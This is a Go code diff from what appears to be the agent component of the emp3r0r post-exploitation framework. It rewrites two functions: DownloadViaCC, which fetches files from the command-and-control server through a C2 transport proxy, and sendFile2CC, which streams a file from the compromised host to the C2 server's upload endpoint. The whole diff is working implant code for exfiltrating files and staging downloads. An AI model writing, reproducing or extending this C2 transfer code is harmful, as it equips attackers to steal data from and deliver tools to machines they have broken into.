@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"io"
 	"log"
 	"net/url"
 	"os"
@@ -54,10 +55,40 @@ func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
 		retData = true
 		log.Printf("No path specified, will return []byte")
 	}
+	lock := fmt.Sprintf("%s.downloading", path)
+	if util.IsFileExist(lock) {
+		err = fmt.Errorf("%s already being downloaded", url)
+		return
+	}
 
-	// use EmpHTTPClient
+	// create file.downloading to prevent racing downloads
+	if !retData {
+		os.Create(lock)
+	}
+
+	// use EmpHTTPClient if no path specified
+	if retData {
+		client := tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
+		resp, err := client.Get(url)
+		if err != nil {
+			err = fmt.Errorf("DownloadViaCC HTTP GET: %v", err)
+			return nil, err
+		}
+		if resp.StatusCode != 200 {
+			err = fmt.Errorf("DownloadViaCC HTTP GET: %s", resp.Status)
+			return nil, err
+		}
+		data, err := io.ReadAll(resp.Body)
+		if err != nil {
+			err = fmt.Errorf("DownloadViaCC read body: %v", err)
+			return nil, err
+		}
+		return data, nil
+	}
+
+	// use grab
 	client := grab.NewClient()
-	client.HTTPClient = tun.EmpHTTPClient(RuntimeConfig.AgentProxy)
+	client.HTTPClient = tun.EmpHTTPClient(emp3r0r_data.CCAddress, RuntimeConfig.C2TransportProxy)
 
 	req, err := grab.NewRequest(path, url)
 	if err != nil {
@@ -65,18 +96,16 @@ func DownloadViaCC(file_to_download, path string) (data []byte, err error) {
 		return
 	}
 	resp := client.Do(req)
-	if retData {
-		return resp.Bytes()
-	}
 
 	// progress
-	t := time.NewTicker(time.Second)
+	t := time.NewTicker(10 * time.Second)
 	defer func() {
 		t.Stop()
-		if !retData && !util.IsFileExist(path) {
+		if !retData && !util.IsExist(path) {
 			data = nil
 			err = fmt.Errorf("Target file '%s' does not exist, downloading from CC may have failed", path)
 		}
+		os.RemoveAll(lock)
 	}()
 	for !resp.IsComplete() {
 		select {
@@ -118,42 +147,19 @@ func sendFile2CC(filepath string, offset int64, token string) (err error) {
 
 	// connect
 	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
-	conn, ctx, cancel, err := ConnectCC(url)
+	conn, _, _, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
 		err = fmt.Errorf("sendFile2CC: connection failed: %v", err)
 		return
 	}
-	defer cancel()
+	// defer cancel()
 	defer conn.Close()
 
-	// read
-	var (
-		buf []byte
-	)
-
-	// read file and send data
-	log.Printf("Reading from %s", filepath)
-	scanner := bufio.NewScanner(f)
-	scanner.Split(bufio.ScanBytes)
-	for ctx.Err() == nil && scanner.Scan() {
-		buf = append(buf, scanner.Bytes()...)
-		if len(buf) == 1024*8 {
-			_, err = conn.Write(buf)
-			if err != nil {
-				return
-			}
-			buf = make([]byte, 0)
-			continue
-		}
+	freader := bufio.NewReader(f)
+	n, err := io.Copy(conn, freader)
+	if err != nil {
+		log.Printf("sendFile2CC failed, %d bytes transfered: %v", n, err)
 	}
-	if len(buf) > 0 && len(buf) < 1024*8 {
-		_, err = conn.Write(buf)
-		if err != nil {
-			return
-		}
-		log.Printf("Sending remaining %d bytes", len(buf))
-	}
-
 	return
 }
